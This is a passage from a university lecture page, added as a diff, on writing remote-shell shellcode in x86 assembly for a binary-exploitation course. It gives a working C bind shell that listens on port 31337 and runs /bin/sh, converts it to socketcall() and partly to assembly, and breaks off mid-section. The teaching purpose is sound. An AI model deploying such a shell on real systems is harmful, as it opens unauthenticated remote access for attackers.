@@ -1,0 +1,1004 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+<title>Lec. 15: Socket Programming in Assembly</title>
+<!-- 2015-10-14 Wed 18:33 -->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="generator" content="Org-mode">
+<meta name="author" content="Adam Aviv">
+<script type="text/javascript" async="" src="Lec.%2015%20Socket%20Programming%20in%20Assembly_files/js"></script><script async="" src="Lec.%2015%20Socket%20Programming%20in%20Assembly_files/analytics.js"></script><script src="Lec.%2015%20Socket%20Programming%20in%20Assembly_files/JZ9vGpdwrDUcq3cLdG-Ygq5uBPc.js"></script><style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="Lec.%2015%20Socket%20Programming%20in%20Assembly_files/class.css">
+<link rel="stylesheet" type="text/css" href="Lec.%2015%20Socket%20Programming%20in%20Assembly_files/print.css" media="print">
+<meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"></head><body><div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="https://ansonliu.com/si485-site/index.html">Home</a> <a href="https://ansonliu.com/si485-site/policy.html">Policy</a> <a href="https://ansonliu.com/si485-site/cal.html">Calendar</a>  <a href="https://ansonliu.com/si485-site/rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012  Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+
+
+<div id="content">
+<h1 class="title">Lec. 15: Socket Programming in Assembly</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#sec-1">1. remote shell using sockets</a></li>
+<li><a href="#sec-2">2. <code>socketcall()</code></a></li>
+<li><a href="#sec-3">3. Converting Remote Shell to Assembly</a>
+<ul>
+<li><a href="#sec-3-1">3.1. <code>socket()</code> in assembly</a></li>
+<li><a href="#sec-3-2">3.2. <code>bind()</code> in assembly</a></li>
+<li><a href="#sec-3-3">3.3. <code>listen()</code> in assembly</a></li>
+<li><a href="#sec-3-4">3.4. <code>accept()</code>  in assembly</a></li>
+<li><a href="#sec-3-5">3.5. <code>dup2()</code> in assembly</a></li>
+</ul>
+</li>
+<li><a href="#sec-4">4. Putting it all together</a>
+<ul>
+<li><a href="#sec-4-1">4.1. This is some large shell code</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> remote shell using sockets</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+In the last class, we completed a remote shell program using the
+standard socket programs. Here is that program again:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/socket.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;netinet/in.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;arpa/inet.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">void</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">server</span>, <span style="color: #eedd82;">client</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">server and client socket</span>
+
+  <span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span> <span style="color: #eedd82;">host_addr</span>, <span style="color: #eedd82;">client_addr</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">address structures</span>
+  <span style="color: #98fb98;">socklen_t</span> <span style="color: #eedd82;">sin_size</span> ; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">store size</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">yes</span>=1;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">open new socket for server</span>
+  server = socket(AF_INET, SOCK_STREAM, 0);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up server address</span>
+  memset(&amp;(host_addr), <span style="color: #ffa07a;">'\0'</span>, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>));
+  host_addr.sin_family=AF_INET;
+  host_addr.sin_port=htons(31337);
+  host_addr.sin_addr.s_addr=INADDR_ANY;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">bind server socket</span>
+  <span style="color: #00ffff;">if</span>(bind(server, (<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span> *) &amp;host_addr, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span>)) &lt; 0){
+    perror(<span style="color: #ffa07a;">"bind"</span>);
+    <span style="color: #00ffff;">return</span> 1;
+  }
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up listening queue</span>
+  listen(server,4);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">size of incoming addresses</span>
+  sin_size = <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">accept incoming connection</span>
+  client = accept(server, (<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span> *) &amp;client_addr, &amp;sin_size);
+
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">duplicate file descriptors for socket</span>
+  dup2(client, 0);
+  dup2(client, 1);
+  dup2(client, 2);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">execve shell</span>
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">args</span>[2]={<span style="color: #ffa07a;">"/bin//sh"</span>, <span style="color: #7fffd4;">NULL</span>};
+  execve(args[0], args, <span style="color: #7fffd4;">NULL</span>);
+
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+
+<p>
+A socket must first be opened using <code>socket()</code>, and then bound to a
+local address using <code>bind()</code>. Next, the number of incoming connections
+must be indicated with <code>listen(), after which, we can finally
+=accept()</code> an incoming connection generating a new socket for that
+connection.
+</p>
+
+<p>
+What makes it a remote shell is that we duplicate the standard file
+decriptors onto the socket. This means all input and output for the
+program are mapped to the new connection. Executing the program
+<code>/bin/sh</code> at this point means that the shell <code>/bin/sh</code>'s standard file
+descriptors are also mapped to the socket, thus forming a remote
+shell.
+</p>
+
+<p>
+That's the state of the world as of the last class when we use the
+socket programming API.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2"><span class="section-number-2">2</span> <code>socketcall()</code></h2>
+<div class="outline-text-2" id="text-2">
+<p>
+<b>The problem is: It's all been a lie!</b>
+</p>
+
+<p>
+It turns out that all the different system calls for sockets are not
+real. There is actually only ONE system call. the
+<code>socketcall()</code>. Here's the man page entry.
+</p>
+
+<pre class="example">SYNOPSIS
+       int socketcall(int call, unsigned long *args);
+
+DESCRIPTION
+       socketcall()  is  a common kernel entry point for the socket system calls.  call determines which socket function to invoke.  args points to a block containing the actual arguments, which are passed through to the appropriate
+       call.
+
+       User programs should call the appropriate functions by their usual names.  Only standard library implementors and kernel hackers need to know about socketcall().
+</pre>
+
+
+<p>
+We are kernel hackers, so let's go get'em. Parsing the arguments to
+socketcall() there are two arguments, the call and the args. The call
+is an integer identifier for the socket function required. These are
+defined in the header file <code>net.h</code>:
+</p>
+
+<pre class="example">user@si485H-base:demo$ grep SYS_ /usr/include/linux/net.h 
+#define SYS_SOCKET	1		/* sys_socket(2)		*/
+#define SYS_BIND	2		/* sys_bind(2)			*/
+#define SYS_CONNECT	3		/* sys_connect(2)		*/
+#define SYS_LISTEN	4		/* sys_listen(2)		*/
+#define SYS_ACCEPT	5		/* sys_accept(2)		*/
+#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)		*/
+#define SYS_GETPEERNAME	7		/* sys_getpeername(2)		*/
+#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
+#define SYS_SEND	9		/* sys_send(2)			*/
+#define SYS_RECV	10		/* sys_recv(2)			*/
+#define SYS_SENDTO	11		/* sys_sendto(2)		*/
+#define SYS_RECVFROM	12		/* sys_recvfrom(2)		*/
+#define SYS_SHUTDOWN	13		/* sys_shutdown(2)		*/
+#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)		*/
+#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)		*/
+#define SYS_SENDMSG	16		/* sys_sendmsg(2)		*/
+#define SYS_RECVMSG	17		/* sys_recvmsg(2)		*/
+#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
+#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)		*/
+#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)		*/
+</pre>
+
+<p>
+The arguments is a array of the arguments that that socket function
+takes. Putting this together, we can convert our call to <code>socket()</code> to a
+<code>socketcall()</code> like so:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/socket.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;netinet/in.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;arpa/inet.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;linux/net.h&gt;</span>
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">void</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">server</span>, <span style="color: #eedd82;">client</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">server and client socket</span>
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span>
+  <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">socket_args</span>[] = {AF_INET,SOCK_STREAM,0};
+  server = socketcall(SYS_SOCKET, (<span style="color: #98fb98;">long</span> *) socket_args);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">...</span>
+}
+</pre>
+</div>
+
+<p>
+But there's a problem. If we try to compile this code: 
+</p>
+
+<pre class="example">user@si485H-base:demo$ make
+gcc -fno-stack-protector -z execstack -Wno-format-security -g    socketcall-example.c   -o socketcall-example
+/tmp/ccPCoZSR.o: In function `main':
+/home/user/git/si485-binary-exploits/lec/15/demo/socketcall-example.c:15: undefined reference to `socketcall'
+collect2: error: ld returned 1 exit status
+make: *** [socketcall-example] Error 1
+</pre>
+
+<p>
+The <code>socketcall()</code> system call is not actually defined as an entry
+point in libc. We have to write our own entry point using <code>syscall</code>:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/syscall.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">socketcall</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">call</span>, <span style="color: #98fb98;">long</span> * <span style="color: #eedd82;">args</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">res</span>;
+  res = syscall(SYS_socketcall, call, args);
+}
+</pre>
+</div>
+
+<p>
+Add that to the code, we can now compile, and convert the rest of our
+remote shell to <code>socketcalls()</code>
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="socketcall-rsh.c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/socket.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;netinet/in.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;arpa/inet.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;linux/net.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/syscall.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">socketcall</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">call</span>, <span style="color: #98fb98;">long</span> * <span style="color: #eedd82;">args</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">res</span>;
+  res = syscall(SYS_socketcall, call, args);
+}
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">void</span>){
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">server</span>, <span style="color: #eedd82;">client</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">server and client socket</span>
+  <span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span> <span style="color: #eedd82;">host_addr</span>, <span style="color: #eedd82;">client_addr</span>; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">address structures</span>
+  <span style="color: #98fb98;">socklen_t</span> <span style="color: #eedd82;">sin_size</span> ; <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">store size</span>
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">socket_args</span>[] = {AF_INET,SOCK_STREAM,0};
+  server = socketcall(SYS_SOCKET, (<span style="color: #98fb98;">long</span> *) socket_args);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up server address</span>
+  memset(&amp;host_addr, <span style="color: #ffa07a;">'\0'</span>, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>));
+  host_addr.sin_family=AF_INET;
+  host_addr.sin_port=htons(31337);
+  host_addr.sin_addr.s_addr=INADDR_ANY;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">bind</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">bind_args</span>[] = {server, (<span style="color: #98fb98;">int</span>) &amp;host_addr, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span>)};
+  socketcall(SYS_BIND, (<span style="color: #98fb98;">long</span> *) bind_args);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up listening queue</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">listen_args</span>[] = {server, 4};
+  socketcall(SYS_LISTEN, (<span style="color: #98fb98;">long</span> *) listen_args);
+
+
+  sin_size = <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">accept incoming connection</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">accept_args</span>[] = {server, (<span style="color: #98fb98;">int</span>) &amp;client_addr, (<span style="color: #98fb98;">int</span>) &amp;sin_size};
+  client = socketcall(SYS_ACCEPT, (<span style="color: #98fb98;">long</span> *) accept_args);
+  client = accept(server, (<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span> *) &amp;client_addr, &amp;sin_size);
+
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">duplicate file descriptors for socket</span>
+  dup2(client, 0);
+  dup2(client, 1);
+  dup2(client, 2); 
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">execve shell</span>
+  <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">args</span>[2]={<span style="color: #ffa07a;">"/bin//sh"</span>, <span style="color: #7fffd4;">NULL</span>};
+  execve(args[0], args, <span style="color: #7fffd4;">NULL</span>);
+
+  <span style="color: #00ffff;">return</span> 0;
+}
+</pre>
+</div>
+
+
+<p>
+And if we run it through strace which will show us all the arguments
+to the system's call, we find that, yes, everything is as it should
+be:
+</p>
+<pre class="example">user@si485H-base:demo$ strace ./socketcall-rsh
+execve("./socketcall-rsh", ["./socketcall-rsh"], [/* 20 vars */]) = 0
+brk(0)                                  = 0x804b000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+(...)
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 4)                            = 0
+accept(3, ...
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3"><span class="section-number-2">3</span> Converting Remote Shell to Assembly</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Now that everything is converted to <code>socketcall()</code>'s, we are still not
+done because we have consider how we might want to construct each of
+the system calls in assembly. This is actually pretty straight
+forward. Let's step through each of the parts:
+</p>
+</div>
+
+<div id="outline-container-sec-3-1" class="outline-3">
+<h3 id="sec-3-1"><span class="section-number-3">3.1</span> <code>socket()</code> in assembly</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+The first task is to call <code>socket()</code> using <code>socketcall()</code> in
+assembly. Here's the code in C.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span>
+<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">socket_args</span>[] = {AF_INET,SOCK_STREAM,0};
+server = socketcall(SYS_SOCKET, (<span style="color: #98fb98;">long</span> *) socket_args);
+</pre>
+</div>
+
+<p>
+The values of <code>socket_args[]</code> is (2,1,0), which we can see in this
+simple program.
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;unistd.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;sys/socket.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;netinet/in.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;arpa/inet.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;linux/net.h&gt;</span>
+
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  printf(<span style="color: #ffa07a;">"PF_INET:%d\n"</span>, PF_INET);
+  printf(<span style="color: #ffa07a;">"SOCK_STREAM:%d\n"</span>, SOCK_STREAM);
+  printf(<span style="color: #ffa07a;">"IPPROTO_IP:%d\n"</span>,IPPROTO_IP);
+
+}
+</pre>
+</div>
+<pre class="example">user@si485H-base:demo$ ./socket_args 
+PF_INET:2
+SOCK_STREAM:1
+IPPROTO_IP:0
+</pre>
+
+<p>
+We also know that SYS<sub>SOCKET</sub> is value 1, so we can follow the assembly code:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">opening the socket                                                           </span>
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">eax</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">0x1</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">0x2</span>
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">ecx</span>,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args                                            </span>
+
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">ebx</span>,ebx
+<span style="color: #87cefa;">inc</span> <span style="color: #00ffff;">ebx</span>                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKET                                             </span>
+
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">al</span>,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL                                         </span>
+
+<span style="color: #87cefa;">int</span> <span style="color: #00ffff;">0x80</span>
+</pre>
+</div>
+
+<p>
+And with strace, we can see that we got what we wanted:
+</p>
+<pre class="example">user@si485H-base:demo$ strace ./open_socket 
+execve("./open_socket", ["./open_socket"], [/* 20 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x3} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3-2" class="outline-3">
+<h3 id="sec-3-2"><span class="section-number-3">3.2</span> <code>bind()</code> in assembly</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+In c, we have:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up server address</span>
+  memset(&amp;host_addr, <span style="color: #ffa07a;">'\0'</span>, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>));
+  host_addr.sin_family=AF_INET;
+  host_addr.sin_port=htons(31337);
+  host_addr.sin_addr.s_addr=INADDR_ANY;
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">bind</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">bind_args</span>[] = {server, (<span style="color: #98fb98;">int</span>) &amp;host_addr, <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr</span>)};
+  socketcall(SYS_BIND, (<span style="color: #98fb98;">long</span> *) bind_args);
+</pre>
+</div>
+
+<p>
+We know the value of SYS<sub>BIND</sub>, that's 2, but we need to think more
+about the <code>host_addr</code> portion of the address space. Fortunately, we
+can recall the structure from last lesson:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span> {
+    <span style="color: #98fb98;">short</span>            <span style="color: #eedd82;">sin_family</span>;   <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">e.g. AF_INET, AF_INET6</span>
+    <span style="color: #98fb98;">unsigned</span> <span style="color: #98fb98;">short</span>   <span style="color: #eedd82;">sin_port</span>;     <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">e.g. htons(3490)</span>
+    <span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">in_addr</span>   <span style="color: #eedd82;">sin_addr</span>;     <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">see struct in_addr, below</span>
+    <span style="color: #98fb98;">char</span>             <span style="color: #eedd82;">sin_zero</span>[8];  <span style="color: #ff7f24;">// </span><span style="color: #ff7f24;">zero this if you want to</span>
+};
+</pre>
+</div>
+
+<p>
+We see that we have two shorts, followed by the address. But, the
+address we care about is <code>INNETADDR_ANY</code> which is 0. The rest is just
+padding.
+</p>
+
+<p>
+So another way to think about this is that the <code>struct sockaddr_in</code> is
+the same as an array of four shorts:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #98fb98;">short</span> <span style="color: #eedd82;">host_addr</span>[] = {0x0002,0x697a,0x00000,0x0000};
+</pre>
+</div>
+
+<p>
+Note that 0x697a is 31337 in big-endian(!) and we always need to be
+careful about that with networking.
+</p>
+
+<p>
+We can write code to produce the <code>host_addr</code> like so:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">eax</span>                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">0,0</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">WORD</span> 0x697a        <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">htonos(31337)</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">WORD</span> 0x02          <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">2</span>
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">ecx</span>,esp
+</pre>
+</div>
+
+<p>
+This assembly is also introducing a new form of push that will only
+push a word onto the stack. This misaligns the stack, but it is a
+useful tool.
+</p>
+
+<p>
+Now we can setup the rest of the code like so:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
